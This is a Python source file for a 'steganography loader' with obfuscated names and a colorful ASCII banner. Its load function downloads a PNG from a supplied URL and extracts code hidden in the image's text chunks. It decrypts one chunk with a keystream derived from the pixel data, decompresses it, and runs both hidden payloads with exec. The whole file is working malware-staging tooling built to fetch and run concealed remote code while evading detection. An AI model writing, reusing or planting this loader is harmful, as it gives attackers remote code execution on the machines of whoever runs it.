import hashlib as _h
import zlib as _z
import urllib.request as _u
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

_A = b"\x89PNG\r\n\x1a\n"

def _B(_C: bytes):
    assert _C.startswith(_A)
    _D, _E = 8, len(_C)
    while _D + 12 <= _E:
        _F = int.from_bytes(_C[_D:_D+4], "big")
        _G = _C[_D+4:_D+8]
        _H = _C[_D+8:_D+8+_F]
        yield _G, _H
        _D += 12 + _F

def _I(_J: bytes) -> bytes:
    _K = _h.sha256()
    for _L, _M in _B(_J):
        if _L == b"IDAT":
            _K.update(_M)
    return _K.digest()

def _N(_O: bytes, _P: int) -> bytes:
    _Q, _R = bytearray(), 0
    while len(_Q) < _P:
        _Q += _h.sha256(_O + _R.to_bytes(8, "big")).digest()
        _R += 1
    return bytes(_Q[:_P])

def _S(_T: bytes, _U: bytes) -> bytes:
    return bytes(_V ^ _W for _V, _W in zip(_T, _U))

def _print_ascii_art():
    """Print ENGSEL GILA ASCII art"""
    ascii_art = f"""
{Fore.CYAN}{'═' * 70}
{Fore.RED + Style.BRIGHT}
 ███████╗███╗   ██╗ ██████╗ ███████╗███████╗██╗         
 ██╔════╝████╗  ██║██╔════╝ ██╔════╝██╔════╝██║         
 █████╗  ██╔██╗ ██║██║  ███╗███████╗█████╗  ██║         
 ██╔══╝  ██║╚██╗██║██║   ██║╚════██║██╔══╝  ██║         
 ███████╗██║ ╚████║╚██████╔╝███████║███████╗███████╗    
 ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝    
{Fore.YELLOW + Style.BRIGHT}
  ██████╗ ██╗██╗      █████╗ 
 ██╔════╝ ██║██║     ██╔══██╗
 ██║  ███╗██║██║     ███████║
 ██║   ██║██║██║     ██╔══██║
 ╚██████╔╝██║███████╗██║  ██║
  ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝
{Fore.CYAN}{'═' * 70}
{Fore.MAGENTA + Style.BRIGHT}          🔐 STEGANOGRAPHY LOADER 🔐
{Fore.CYAN}{'═' * 70}
"""
    print(ascii_art)

def load(_Y: str, _Z: dict):
    _print_ascii_art()
    
    try:
        print(Fore.YELLOW + "🌐 Downloading PNG file...")
        
        print(Fore.YELLOW + "\n🌐 Downloading PNG file...")
        with _u.urlopen(_Y, timeout=5) as _0:
            _1 = _0.read()
        
        if not _1.startswith(_A):
            print(Fore.RED + "❌ Invalid PNG file format!")
            return
        
        print(Fore.GREEN + "✅ PNG file downloaded successfully!")
        
    except Exception as e:
        print(Fore.RED + f"❌ Error loading file: {str(e)}")
        return
    
    print(Fore.CYAN + "\n" + "─" * 70)
    print(Fore.YELLOW + "🔍 Extracting hidden payload...")
    
    _2, _3 = None, None
    for _4, _5 in _B(_1):
        if _4 == b"tEXt" and _5.startswith(b"payload\x00"):
            _2 = _5.split(b"\x00", 1)[1]
            print(Fore.GREEN + "✅ Found tEXt payload chunk!")
        elif _4 == b"iTXt" and _5.startswith(b"pycode\x00"):
            _3 = _5.split(b"\x00", 1)[1]
            print(Fore.GREEN + "✅ Found iTXt pycode chunk!")
    
    if _2:
        try:
            print(Fore.YELLOW + "\n⚙️  Executing tEXt payload...")
            exec(_2.decode("utf-8", "ignore"), _Z)
            print(Fore.GREEN + "✅ tEXt payload executed successfully!")
        except Exception as e:
            print(Fore.RED + f"❌ Error executing tEXt payload: {str(e)}")
            pass
    
    if _3:
        try:
            print(Fore.YELLOW + "\n🔐 Decrypting steganographic payload...")
            _6 = _I(_1)
            print(Fore.CYAN + "   → Generating encryption key from IDAT chunks...")
            
            _7 = _N(_6, len(_3))
            print(Fore.CYAN + "   → Deriving key stream...")
            
            _8 = _S(_3, _7)
            print(Fore.CYAN + "   → XOR decryption...")
            
            _9 = _z.decompress(_8).decode("utf-8", "ignore")
            print(Fore.CYAN + "   → Decompressing payload...")
            
            _10 = compile(_9, "<stego>", "exec")
            print(Fore.CYAN + "   → Compiling code...")
            
            exec(_10, _Z)
            print(Fore.GREEN + "✅ Steganographic payload executed successfully!")
            
        except Exception as e:
            print(Fore.RED + f"❌ Error processing steganographic payload: {str(e)}")
            pass
    
    print(Fore.CYAN + "\n" + "═" * 70)
    print(Fore.GREEN + Style.BRIGHT + "🎉 Loading complete!")
    print(Fore.CYAN + "═" * 70 + "\n")
    
    return None  # Return None since we're using custom ASCII art